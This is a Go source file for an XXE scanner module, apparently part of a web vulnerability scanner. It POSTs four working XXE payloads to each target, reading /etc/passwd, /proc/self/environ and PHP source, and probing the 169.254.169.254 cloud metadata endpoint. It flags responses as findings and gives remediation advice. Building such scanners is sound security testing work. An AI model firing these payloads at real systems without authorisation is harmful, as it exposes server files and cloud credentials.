package engine

import (
	"bytes"
	"context"
	"fmt"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"time"
)

type XXEScannerModule struct {
	scanner *VulnScanner
}

func NewXXEScannerModule(scanner *VulnScanner) *XXEScannerModule {
	if scanner == nil {
		scanner = NewVulnScanner(map[string]interface{}{"module_name": "xxe-scanner"})
	}
	return &XXEScannerModule{scanner: scanner}
}

func (m *XXEScannerModule) ID() string       { return "xxe-scanner" }
func (m *XXEScannerModule) Name() string     { return "XXE Scanner" }
func (m *XXEScannerModule) Category() string { return "web" }

func (m *XXEScannerModule) Run(ctx context.Context, targets []*Target, config map[string]interface{}) (*ModuleResult, error) {
	start := time.Now()
	result := &ModuleResult{ModuleID: m.ID()}
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, 5)

	for _, target := range targets {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		if target.URL == "" && target.Host != "" {
			target.URL = fmt.Sprintf("http://%s", target.Host)
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(t *Target) {
			defer wg.Done()
			defer func() { <-sem }()

			findings := m.scanTarget(ctx, t)
			if len(findings) > 0 {
				mu.Lock()
				result.Findings = append(result.Findings, findings...)
				mu.Unlock()
			}
		}(target)
	}

	wg.Wait()
	result.Duration = time.Since(start)
	slog.Info("[XXE-Scanner] 扫描完成",
		"targets", len(targets),
		"findings", len(result.Findings),
		"duration", result.Duration,
	)

	return result, nil
}

func (m *XXEScannerModule) scanTarget(ctx context.Context, target *Target) []*Finding {
	var findings []*Finding

	xxePayloads := []struct {
		payload  string
		evidence string
	}{
		{
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
			"root:x:0:0",
		},
		{
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>`,
			"PD9waHA",
		},
		{
			`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/instance-id">]><root>&xxe;</root>`,
			"i-",
		},
		{
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>`,
			"PATH=",
		},
	}

	for _, p := range xxePayloads {
		body, statusCode, err := m.scanner.Client.Fetch(m.newPostRequest(ctx, target.URL, p.payload))
		if err != nil {
			continue
		}

		if statusCode == http.StatusOK && len(body) > 0 {
			if strings.Contains(body, p.evidence) ||
				strings.Contains(body, "root:x:") ||
				strings.Contains(body, "PATH=") {
				findings = append(findings, &Finding{
					Target:      target,
					Type:        "xxe",
					Title:       "XML External Entity (XXE) Injection",
					Description: "The application processes XML input with external entity references, potentially allowing file read or SSRF",
					Severity:    "high",
					Confidence:  80,
					Evidence:    fmt.Sprintf("POST %s returned evidence of XXE exploitation", target.URL),
					Timestamp:   time.Now(),
					Remediation: "Disable external entity processing in XML parser, use JSON instead of XML if possible",
					Data: map[string]string{
						"evidence": p.evidence,
					},
				})
			}
		}
	}

	return findings
}

func (m *XXEScannerModule) newPostRequest(ctx context.Context, url, body string) *http.Request {
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBufferString(body))
	req.Header.Set("Content-Type", "application/xml")
	return req
}
